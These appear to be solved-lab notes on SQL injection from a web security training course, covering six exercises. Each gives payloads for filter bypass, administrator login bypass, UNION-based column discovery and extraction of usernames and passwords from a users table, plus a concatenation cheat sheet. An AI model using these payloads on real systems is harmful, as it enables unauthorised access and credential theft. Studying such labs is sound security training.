
## 🤫 Lab 1 - Retrieving Hidden Data via SQL Injection

**Lab:** SQL Injection Vulnerability allows retrieving hidden data  
**Status:** ✅ Solved  
**Target:** Display unreleased products via SQL Injection

### Lab Context

The lab contains a SQL injection vulnerability in the product category filter. Query structure:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

### Goal

- ✅ Exploit SQL Injection to bypass filter and display unreleased products.

### Basic Injection Strategy

Use:

```
https://insecure-website.com/products?category=Gifts'--
```

Which turns the query into:

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

### OR-Based Bypass

```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

### Injection Cheat Sheet

| Type        | Payload     | Effect                      |
|-------------|-------------|-----------------------------|
| Comment     | `'--`       | Comments out the query      |
| Boolean OR  | `' OR 1=1--`| Bypasses condition check    |

---

## 💉 Lab 2 - Login Bypass via SQL Injection

**Lab:** SQL Injection Vulnerability Allowing Login Bypass  
**Status:** ✅ Solved  
**Target:** Log in as `administrator` by bypassing authentication

### Attack Example

Payload for username:

```sql
administrator'--
```

Backend transforms to:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

Also possible:

- Username: `administrator`
- Password: `' OR 1=1 --`

---

## 🔍 Lab 3 - Determining Number of Columns via UNION

**Lab:** SQL injection UNION attack, determining the number of columns  
**Status:** ✅ Solved  
**Target:** Discover column count using UNION

### Techniques

- Try increasing NULLs:
  ```
  '+UNION+SELECT+NULL--  
  '+UNION+SELECT+NULL,NULL--  
  ```

- Use ORDER BY:
  ```
  ' ORDER BY 1--  
  ' ORDER BY 3--  
  ```

---

## 🔍 Lab 4 - Finding Text-Compatible Column

**Lab:** SQL injection UNION attack to find text column  
**Status:** ✅ Solved  
**Target:** Leak usernames/passwords

### Steps

1. Determine columns:  
   ```
   '+UNION+SELECT+NULL,NULL-- 
   ```

2. Find text support:  
   ```
   '+UNION+SELECT+'abc',NULL--  
   '+UNION+SELECT+NULL,'abc'--  
   ```

3. Final payload:
   ```
   '+UNION+SELECT+NULL,username||'*'||password+FROM+users--
   ```

---

## 🧠 Lab 5 - Retrieve Data From Other Tables

**Lab:** SQL injection UNION attack, retrieving data from other tables  
**Status:** ✅ Solved  
**Target:** Extract usernames/passwords from `users` table

### Process

1. Columns count:  
   ```
   ' UNION SELECT NULL,NULL-- 
   ```

2. Find text columns:  
   ```
   ' UNION SELECT 'abc','def'-- 
   ```

3. Final payload:  
   ```
   ' UNION SELECT username, password FROM users-- 
   ```

---

## 💻 Lab 6 - Retrieve Multiple Values in One Column

**Lab:** SQL injection UNION attack with string concatenation  
**Status:** ✅ Solved  
**Target:** Extract usernames/passwords into a single column

### Process

1. Check text column:
   ```
   '+UNION+SELECT+NULL,'abc'-- 
   ```

2. Combine data:
   ```
   '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
   ```

### String Concatenation Cheats

| DBMS        | Syntax                        |
|-------------|-------------------------------|
| Oracle      | `'a'||'b'`                    |
| PostgreSQL  | `'a'||'b'`                    |
| MySQL       | `CONCAT('a','b')`             |
| Microsoft   | `'a' + 'b'`                   |
